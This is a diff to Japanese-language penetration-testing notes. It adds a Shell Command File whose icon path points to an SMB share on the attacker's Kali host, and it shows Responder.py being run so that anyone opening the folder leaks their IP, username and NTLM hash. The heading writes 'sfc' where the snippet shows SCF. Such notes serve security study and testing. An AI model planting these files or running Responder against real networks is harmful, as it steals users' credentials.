@@ -27,10 +27,22 @@
     IconIndex=1
 ```
 
+- sfcファイルも使える
+
+``` shell
+    [shell]
+    Command=2
+    IconFile=\\[kaliのIPアドレス]\[共有ファルダ]\nc.ico
+    [Taskbar]
+    Command=ToggleDesktop
+```
+
+> 他にもRTF、XMLとかも使えるらしい
+
 - kaliでResponder.pyを起動
 
 ``` shell
-    Python2 Responder.py -I ens
+    Python2 Responder.py -I eth1
 ```
 
 リンクファイルのあるフォルダを開くと IP、Username、NTLMハッシュがkaliに送信される。
